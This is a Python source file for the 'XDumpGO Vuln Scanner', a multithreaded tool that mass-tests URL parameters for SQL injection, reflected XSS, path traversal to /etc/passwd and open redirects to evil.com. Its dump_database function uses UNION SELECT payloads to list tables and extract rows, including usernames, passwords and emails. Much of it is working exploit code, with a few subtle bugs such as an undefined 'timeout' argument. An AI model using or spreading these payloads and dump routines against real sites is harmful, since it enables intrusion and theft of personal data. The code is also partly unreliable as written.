# XDumpGO Vuln Scanner - Production Grade
# Proper Error-Based + Union-Based SQLi | XSS | LFI | Open Redirect
import re, time, random, threading, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
CONNECT_TIMEOUT = 5
READ_TIMEOUT = 8
TIMEOUT = (CONNECT_TIMEOUT, READ_TIMEOUT)

# ============ SQL ERROR PATTERNS (DB-specific) ============
SQL_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"MySqlClient\.", r"check the manual that corresponds to your MySQL server",
        r"Unknown column", r"mysql_fetch", r"mysql_num_rows", r"mysql_query",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError", r"org\.postgresql\.util\.PSQLException",
    ],
    "MSSQL": [
        r"Microsoft OLE DB.*SQL", r"ODBC Driver.*SQL", r"SQLServer JDBC",
        r"SqlException", r"System\.Data\.SqlClient\.SqlException",
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near", r"nvarchar", r"varchar",
    ],
    "Oracle": [
        r"Oracle error", r"Oracle.*Driver", r"ORA-\d{5}",
        r"PLS-", r"SP2-", r"java\.sql\.SQLException",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
    ],
    "General": [
        r"SQL syntax", r"mysql_.*\(\)", r"Unclosed quotation mark",
        r"syntax error", r"unterminated quoted", r"SQL command not properly ended",
        r"you have an error in your SQL syntax", r"supplied argument is not a valid MySQL",
        r"Column count doesn't match", r"unknown column",
        r"violation of UNIQUE KEY constraint",
    ],
}

# ============ ERROR-BASED PAYLOADS (minimal, most effective) ============
ERROR_PAYLOADS = [
    "'",                # Single quote - catches 80% of SQLi
    '"',                # Double quote
    "\\",               # Backslash (MySQL escape)
]

# ============ UNION-BASED TESTING ============
ORDER_BY_PREFIXES = [
    "' ORDER BY %d-- ",
    '" ORDER BY %d-- ',
    " ORDER BY %d-- ",
]

UNION_SELECT_TEMPLATES = [
    "' UNION SELECT %s-- ",
    '" UNION SELECT %s-- ',
    " UNION SELECT %s-- ",
]

# ============ DATABASE EXTRACTION (version/name) ============
DB_FINGERPRINT = {
    "MySQL": {
        "version": ["@@version", "version()"],
        "db_name": ["database()", "schema()"],
        "user":    ["user()", "current_user()"],
    },
    "PostgreSQL": {
        "version": ["version()", "current_setting('server_version')"],
        "db_name": ["current_database()"],
        "user":    ["current_user", "user"],
    },
    "MSSQL": {
        "version": ["@@version"],
        "db_name": ["db_name()", "db_name(0)"],
        "user":    ["system_user", "user_name()"],
    },
    "Oracle": {
        "version": ["banner", "(select banner from v$version where rownum=1)"],
        "db_name": ["global_name", "(select global_name from global_name)"],
        "user":    ["user"],
    },
}

# ============ XSS ============
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><svg onload=alert('XSS')>",
    "\"><img src=x onerror=alert('XSS')>",
]

# ============ LFI ============
LFI_PAYLOADS = {
    "linux": ["../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd%00"],
    "windows": ["..\\..\\..\\windows\\win.ini", "....\\\\....\\\\....\\\\windows\\\\win.ini"],
}
LFI_SIGS = [r"root:.*:0:0:", r"\[fonts\]", r"\[extensions\]", r"\[mci extensions\]", r"daemon:x:"]

# ============ HELPERS ============
def parse_url_params(url):
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return parsed, params

def _make_session(proxy=None):
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5"})
    s.verify = False
    adp = HTTPAdapter(max_retries=Retry(total=0), pool_connections=200, pool_maxsize=200)
    s.mount('http://', adp); s.mount('https://', adp)
    if proxy: s.proxies = {"http": proxy, "https": proxy}
    return s

def _build_url(parsed, new_params):
    qs = urllib.parse.urlencode(new_params, doseq=True)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}" if qs else f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

# ============ FINGERPRINT DB TYPE ============
def _fingerprint_db(text):
    for dbtype in ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"]:
        for pat in SQL_ERROR_PATTERNS.get(dbtype, []):
            if re.search(pat, text, re.IGNORECASE):
                return dbtype
    return "Unknown"

# ============ ERROR-BASED SQLI ============
def test_sqli_error(url, proxy=None):
    """Test each parameter with error payloads. Only returns if SQL error found."""
    parsed, params = parse_url_params(url)
    if not params: return None
    
    sess = _make_session(proxy)
    
    for param, values in list(params.items())[:2]:
        orig_val = values[0] if values else ""
        
        for payload in ERROR_PAYLOADS:
            new_params = dict(params)
            new_params[param] = [orig_val + payload]
            t_url = _build_url(parsed, new_params)
            
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)
                
                # Check if any SQL error pattern matches
                for dbtype, patterns in SQL_ERROR_PATTERNS.items():
                    for pat in patterns:
                        if re.search(pat, resp.text, re.IGNORECASE):
                            sess.close()
                            return (url, "SQLi", f"[{dbtype}] Error-based via '{param}' | Payload: {payload} | DB: {dbtype}")
                
                # 500/503 without explicit SQL error - weak signal, try union-based instead
                
            except Exception as e:
                err = str(e).lower()
                if "timeout" in err or "timed" in err:
                    pass  # Will be tested by time-based later
    
    sess.close()
    return None

# ============ UNION-BASED SQLI ============
def test_sqli_union(url, proxy=None):
    """Determine column count via ORDER BY, then UNION SELECT to extract DB info."""
    parsed, params = parse_url_params(url)
    if not params: return None
    
    # Only test params that look like IDs (numeric)
    id_params = {k: v[0] for k, v in params.items() 
                 if v[0].isdigit() or any(c in v[0] for c in ('-', '/', '=',))}
    if not id_params: return None
    
    sess = _make_session(proxy, timeout)
    
    for param, orig_val in list(id_params.items())[:1]:
        # Step 1: Try ORDER BY to find column count
        cols = None
        for prefix in ORDER_BY_PREFIXES[:2]:
            for n in [3, 10, 20, 50]:
                new_params = dict(params)
                new_params[param] = [orig_val + (prefix % n)]
                t_url = _build_url(parsed, new_params)
                try:
                    resp = sess.get(t_url, timeout=TIMEOUT)
                    for pat in SQL_ERROR_PATTERNS.get("General", [])[:5]:
                        if re.search(pat, resp.text, re.IGNORECASE):
                            cols = n - 1
                            break
                    if cols: break
                    # Also detect via MySQL "Unknown column in order clause"
                    if re.search(r"Unknown column", resp.text, re.IGNORECASE):
                        cols = n - 1
                        break
                except: pass
            if cols: break
        
        if not cols or cols < 1: continue
        
        # Step 2: Build UNION SELECT to extract version
        nulls = ", ".join(["NULL"] * cols)
        
        for template in UNION_SELECT_TEMPLATES[:3]:
            # Try extracting version
            for dbtype, funcs in DB_FINGERPRINT.items():
                for ver_func in funcs["version"][:1]:
                    # Replace first NULL with version function
                    cols_list = [f"{ver_func}"] + ["NULL"] * (cols - 1)
                    union_payload = template % ", ".join(cols_list)
                    
                    new_params = dict(params)
                    new_params[param] = [orig_val + union_payload]
                    t_url = _build_url(parsed, new_params)
                    
                    try:
                        resp = sess.get(t_url, timeout=TIMEOUT)
                        # Look for version numbers in response
                        ver_match = re.search(r'(\d+\.\d+\.\d+)', resp.text)
                        if ver_match:
                            sess.close()
                            return (url, "SQLi", f"[{dbtype}] Union-based via '{param}' | Columns: {cols} | Version: {ver_match.group(1)}")
                    except: pass
        
        # Step 3: Even without version, if ORDER BY worked and no error on UNION, report
        # Quick UNION SELECT NULL test
        for template in UNION_SELECT_TEMPLATES[:3]:
            cs = "NULL, " * cols
            cs = cs.rstrip(", ")
            union_payload = template % cs
            new_params = dict(params)
            new_params[param] = [orig_val + union_payload]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)
                if resp.status_code == 200:
                    # Check no SQL error in response
                    has_error = False
                    for pat in SQL_ERROR_PATTERNS.get("General", [])[:3]:
                        if re.search(pat, resp.text, re.IGNORECASE):
                            has_error = True; break
                    len_ok = len(resp.text) > 50  # Non-empty response
                    if not has_error and len_ok:
                        sess.close()
                        return (url, "SQLi", f"Union-based via '{param}' | Columns: {cols} | UNION SELECT NULL confirmed")
            except: pass
    
    sess.close()
    return None

# ============ XSS ============
def test_xss(url, proxy=None):
    parsed, params = parse_url_params(url)
    if not params: return None
    
    sess = _make_session(proxy, timeout)
    
    for param, values in list(params.items())[:2]:
        orig = values[0] if values else ""
        for payload in XSS_PAYLOADS[:2]:
            new_params = dict(params)
            new_params[param] = [payload]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)
                # Check if payload is reflected unencoded
                if "alert('XSS')" in resp.text or "<svg onload=alert" in resp.text:
                    sess.close()
                    return (url, "XSS", f"Reflected via '{param}' | Payload reflected in response")
            except: pass
    
    sess.close()
    return None

# ============ LFI ============
def test_lfi(url, proxy=None):
    parsed, params = parse_url_params(url)
    if not params: return None
    
    file_params = [p for p in params if any(k in p.lower() 
        for k in ('file', 'page', 'include', 'path', 'doc', 'template', 'dir', 'load', 'view', 'read', 'content'))]
    if not file_params: return None
    
    sess = _make_session(proxy, timeout)
    
    for param in file_params[:2]:
        for lfi_type, payloads in LFI_PAYLOADS.items():
            for payload in payloads[:2]:
                new_params = dict(params)
                new_params[param] = [payload]
                t_url = _build_url(parsed, new_params)
                try:
                    resp = sess.get(t_url, timeout=TIMEOUT)
                    for sig in LFI_SIGS:
                        if re.search(sig, resp.text, re.IGNORECASE):
                            sess.close()
                            return (url, "LFI", f"Via '{param}' | Payload: {payload} | System file detected")
                except: pass
    
    sess.close()
    return None

# ============ OPEN REDIRECT ============
def test_redirect(url, proxy=None):
    parsed, params = parse_url_params(url)
    if not params: return None
    
    redir_kw = ('redirect', 'url', 'next', 'return', 'goto', 'target', 'link', 'dest', 'continue', 'forward', 'redir', 'rurl')
    redir_params = [p for p in params if any(k in p.lower() for k in redir_kw)]
    if not redir_params: return None
    
    sess = _make_session(proxy, timeout)
    
    for param in redir_params[:2]:
        new_params = dict(params)
        new_params[param] = ["https://evil.com"]
        t_url = _build_url(parsed, new_params)
        try:
            resp = sess.get(t_url, timeout=TIMEOUT, allow_redirects=False)
            if resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get('Location', '')
                if 'evil.com' in loc:
                    sess.close()
                    return (url, "Open Redirect", f"Via '{param}' | Redirects to evil.com")
        except: pass
    
    sess.close()
    return None

# ============ FAST SINGLE-PASS SCAN ============
def scan_url_fast(url, proxy=None):
    """
    Single-pass fast scan. Tests SQLi first, then secondary vulns only if no SQLi found.
    Returns (url, vuln_type, evidence) or None.
    Max ~10 HTTP requests per URL.
    """
    parsed, params = parse_url_params(url)
    if not params:
        return None
    
    sess = _make_session(proxy)
    
    # === PASS 1: Error-Based SQLi (6 requests max) ===
    for param, values in list(params.items())[:2]:
        orig = values[0] if values else ""
        for payload in ERROR_PAYLOADS:
            new_params = dict(params)
            new_params[param] = [orig + payload]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)
                for dbtype, patterns in SQL_ERROR_PATTERNS.items():
                    for pat in patterns:
                        if re.search(pat, resp.text, re.IGNORECASE):
                            sess.close()
                            return (url, "SQLi", f"[{dbtype}] Error-based via '{param}' | Payload: {payload}")
                
                # 500/503 = potential SQLi, try quick union
                if resp.status_code in (500, 503):
                    # Quick ORDER BY test
                    for ord_pfx in [f"' ORDER BY {n}-- " for n in [10, 50]]:
                        new_params[param] = [orig + ord_pfx]
                        try:
                            r = sess.get(_build_url(parsed, new_params), timeout=TIMEOUT)
                            if re.search(r"Unknown column|order by", r.text, re.IGNORECASE):
                                # Try UNION SELECT NULL
                                for cs in ["1", "1,2,3,4,5", "1,2,3,4,5,6,7,8,9,10"]:
                                    new_params[param] = [orig + f"' UNION SELECT {cs}-- "]
                                    try:
                                        r2 = sess.get(_build_url(parsed, new_params), timeout=TIMEOUT)
                                        if r2.status_code == 200 and len(r2.text) > 100:
                                            ver = re.search(r'(\d+\.\d+\.\d+)', r2.text)
                                            if ver:
                                                sess.close()
                                                return (url, "SQLi", f"Union-based via '{param}' | Version: {ver.group(1)}")
                                    except: pass
                        except: pass
            except: pass
            if not _check_alive(url, sess): sess.close(); return None
    
    # === PASS 2: XSS (1 request) ===
    for param, values in list(params.items())[:1]:
        new_params = dict(params)
        new_params[param] = [XSS_PAYLOADS[0]]
        try:
            resp = sess.get(_build_url(parsed, new_params), timeout=TIMEOUT)
            if "alert('XSS')" in resp.text:
                sess.close()
                return (url, "XSS", f"Reflected via '{param}'")
        except: pass
        break
    
    # === PASS 3: LFI (only file params, 2 requests) ===
    file_params = [p for p in params if any(k in p.lower() for k in ('file','page','include','path','doc','template','dir','load','view','read','content'))]
    if file_params:
        for param in file_params[:1]:
            for payload in ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"]:
                new_params = dict(params)
                new_params[param] = [payload]
                try:
                    resp = sess.get(_build_url(parsed, new_params), timeout=TIMEOUT)
                    for sig in LFI_SIGS:
                        if re.search(sig, resp.text, re.IGNORECASE):
                            sess.close()
                            return (url, "LFI", f"Via '{param}' | {payload}")
                except: pass
    
    # === PASS 4: Open Redirect (only redirect params, 1 request) ===
    redir_kw = ('redirect','url','next','return','goto','target','link','dest','continue','forward','redir','rurl')
    redir_params = [p for p in params if any(k in p.lower() for k in redir_kw)]
    if redir_params:
        new_params = dict(params)
        new_params[redir_params[0]] = ["https://evil.com"]
        try:
            resp = sess.get(_build_url(parsed, new_params), timeout=(5,5), allow_redirects=False)
            if resp.status_code in (301,302,303,307,308):
                if 'evil.com' in resp.headers.get('Location',''):
                    sess.close()
                    return (url, "Open Redirect", f"Via '{redir_params[0]}'")
        except: pass
    
    sess.close()
    return None

def _check_alive(url, sess=None):
    """Quick check if URL is reachable"""
    close_session = False
    if sess is None:
        sess = _make_session()
        close_session = True
    try:
        sess.head(url, timeout=(5,5))
        if close_session: sess.close()
        return True
    except:
        if close_session: sess.close()
        return False

# ============ SCANNER CLASS (Ultra Fast) ============
class VulnScanner:
    def __init__(self, threads=30, proxy=None):
        self.threads = threads
        self.proxy = proxy
        self.running = False
        self.results = {"SQLi": [], "XSS": [], "LFI": [], "Open Redirect": []}
        self.scanned = 0
        self.total = 0
        self.start_time = 0
        self.errors = 0
        self._lock = threading.Lock()

    def stop(self): self.running = False

    def scan_urls(self, urls, progress_callback=None, result_callback=None):
        if not urls: return
        
        self.running = True
        self.scanned = 0; self.total = len(urls)
        self.start_time = time.time(); self.errors = 0
        self.results = {"SQLi": [], "XSS": [], "LFI": [], "Open Redirect": []}
        
        def _worker(url):
            if not self.running: return
            try:
                result = scan_url_fast(url, proxy=self.proxy)
                with self._lock:
                    self.scanned += 1
                    if result:
                        url_r, vtype, ev = result
                        self.results[vtype].append((url_r, ev))
                        if result_callback: result_callback(result)
                # Progress
                if progress_callback and self.scanned % 10 == 0:
                    progress_callback(self.scanned, self.total, self.get_result_count())
            except:
                with self._lock:
                    self.errors += 1
                    self.scanned += 1
        
        # Submit all at once - no batching
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(_worker, url) for url in urls]
            for f in futures:
                try: f.result(timeout=120)
                except: pass
        
        self.running = False
        if progress_callback:
            progress_callback(self.scanned, self.total, self.get_result_count())
        return self.results

    def get_result_count(self):
        return sum(len(v) for v in self.results.values())

    def generate_report(self):
        total = self.get_result_count()
        elapsed = time.time() - self.start_time
        lines = [
            "=" * 50,
            "   XDumpGO Vuln Scan Report",
            "=" * 50,
            f"Scanned: {self.scanned}/{self.total}",
            f"Vulns Found: {total}",
            f"Errors: {self.errors}",
            f"Time: {elapsed:.1f}s",
            f"Speed: {self.scanned/(elapsed/60):.0f} URL/min" if elapsed > 0 else "",
        ]
        for vt in ["SQLi", "XSS", "LFI", "Open Redirect"]:
            items = self.results.get(vt, [])
            if items:
                lines.append(f"\n{vt}: {len(items)}")
                for url, ev in items[:50]:
                    lines.append(f"  {url}\n    -> {ev}")
        return "\n".join(lines)

# ============ DB DUMP ENGINE ============
def dump_database(url, param, proxy=None, max_rows=30, callback=None):
    """
    Extract data from confirmed SQLi using UNION SELECT.
    Tries info_schema first, falls back to common tables.
    Returns dict with dump_text, tables_found, rows_dumped.
    """
    parsed, params = parse_url_params(url)
    orig_val = params.get(param, [''])[0]
    sess = _make_session(proxy)
    
    def _query(payload):
        new_params = dict(params); new_params[param] = [orig_val + payload]
        try:
            r = sess.get(_build_url(parsed, new_params), timeout=TIMEOUT)
            return r.text if r.status_code == 200 else None
        except: return None
    
    def _find_cols():
        for n in [10, 20, 30, 5, 15]:
            for pfx in [f"' ORDER BY {n}-- ", f'" ORDER BY {n}-- ', f" ORDER BY {n}-- "]:
                resp = _query(pfx)
                if resp and re.search(r"Unknown column|order by|ORA-", resp, re.IGNORECASE):
                    return n - 1
        return 5  # default guess
    
    def _union(selects):
        cs = ",".join(str(s) for s in selects[:15])
        for tmpl in ["' UNION SELECT %s-- ", '" UNION SELECT %s-- ']:
            resp = _query(tmpl % cs)
            if resp and len(resp) > 50:
                clean = re.sub(r'<[^>]+>', '\n', resp)
                clean = re.sub(r'\s{2,}', '\n', clean).strip()
                return [l.strip() for l in clean.split('\n') if l.strip() and len(l) > 2]
        return None
    
    dump_text = []
    dump_text.append("=" * 50)
    dump_text.append(f"URL: {url}")
    dump_text.append(f"Param: {param}")
    dump_text.append("=" * 50)
    
    if callback: callback("init", "🔍 Finding columns...")
    
    # Step 1: Columns
    cols = _find_cols()
    dump_text.append(f"\nColumns: {cols}")
    if callback: callback("cols", f"📊 Columns: {cols}")
    
    # Step 2: Try DB name
    if callback: callback("db", "🗄 DB name...")
    for func in ["database()", "current_database()", "db_name()", "@@version"]:
        sel = [func] + ["NULL"]*(cols-1)
        rows = _union(sel)
        if rows:
            dump_text.append(f"DB Info: {' | '.join(rows[:3])}")
            if callback: callback("db", f"🗄 {' '.join(rows[:2])[:60]}")
            break
    
    # Step 3: Tables - try info_schema, fallback to common tables
    if callback: callback("tables", "📋 Tables...")
    tables_found = []
    
    # Try MySQL/PG
    table_payloads = [
        f"0' UNION SELECT TABLE_NAME,{','.join(['NULL']*(cols-2))} FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1 OFFSET 0-- ",
        f"0' UNION SELECT table_name,{','.join(['NULL']*(cols-2))} FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0-- ",
    ]
    for tp in table_payloads:
        resp = _query(tp)
        if resp and len(resp) > 20:
            clean = re.sub(r'<[^>]+>', '|', resp)
            found = re.findall(r'[\w_]{2,40}', clean)
            found = [f for f in found if f.lower() not in ('null','none','undefined','nan','information_schema','select','union','from','where')]
            tables_found.extend(found[:3])
            if tables_found: break
    
    # Fallback: try common table names
    if not tables_found:
        common = ["users","admin","user","members","accounts","products","posts","news","orders",
                  "login","settings","config","categories","pages","contact","messages","comments",
                  "customer","employee","students","items","inventory"]
        for tbl in common[:10]:
            p = f"0' UNION SELECT COUNT(*),{','.join(['NULL']*(cols-2))} FROM {tbl}-- "
            resp = _query(p)
            if resp:
                nums = re.findall(r'\d+', resp)
                if nums and any(int(n) > 0 for n in nums):
                    tables_found.append(tbl)
                    if len(tables_found) >= 5: break
    
    tables_found = list(dict.fromkeys(tables_found))[:5]
    dump_text.append(f"Tables: {', '.join(tables_found) if tables_found else 'N/A'}")
    if callback: callback("tables", f"📋 Tables: {len(tables_found)} found")
    
    # Step 4: Dump each table
    total_rows = 0
    for tbl in tables_found:
        if callback: callback("dumping", f"� Dumping {tbl}...")
        dump_text.append(f"\n--- {tbl} ---")
        
        # Get columns via information_schema or guess common names
        cols_found = []
        col_payload = f"0' UNION SELECT COLUMN_NAME,{','.join(['NULL']*(cols-2))} FROM information_schema.COLUMNS WHERE TABLE_NAME='{tbl}' LIMIT 1 OFFSET 0-- "
        resp = _query(col_payload)
        if resp and len(resp) > 5:
            clean = re.sub(r'<[^>]+>', '|', resp)
            cols_found = re.findall(r'[\w_]{2,30}', clean)
            cols_found = [c for c in cols_found if c.lower() not in ('null','information_schema','select','union','column_name')][:5]
        
        if not cols_found:
            cols_found = ["id","name","email","username","password","title","date","status","phone","address","content","subject"][:cols]
        
        dump_text.append(f"  Columns: {', '.join(cols_found[:8])}")
        
        # Dump rows
        rows_dumped = 0
        for off in range(0, max_rows, 5):
            sel_cols = cols_found[:cols]
            while len(sel_cols) < cols:
                sel_cols.append("NULL")
            sel_str = ",".join(sel_cols[:cols])
            dump_payload = f"0' UNION SELECT {sel_str} FROM {tbl} LIMIT 5 OFFSET {off}-- "
            
            resp = _query(dump_payload)
            if resp:
                clean = re.sub(r'<[^>]+>', ' | ', resp)
                clean = re.sub(r'\s+', ' ', clean).strip()
                lines = [l.strip() for l in clean.split('|') if l.strip() and len(l) > 3]
                for l in lines[:3]:
                    dump_text.append(f"  [{off+rows_dumped+1}] {l[:200]}")
                    rows_dumped += 1
                    total_rows += 1
                    if rows_dumped >= 5: break
            
            if rows_dumped >= 5 or rows_dumped == 0: break
        
        dump_text.append(f"  Total: {rows_dumped} rows")
    
    if callback: callback("done", f"✅ Dump complete! {total_rows} rows")
    
    result = {
        "dump_text": "\n".join(dump_text),
        "tables_found": tables_found,
        "rows_dumped": total_rows,
        "column_count": cols,
    }
    sess.close()
    return result
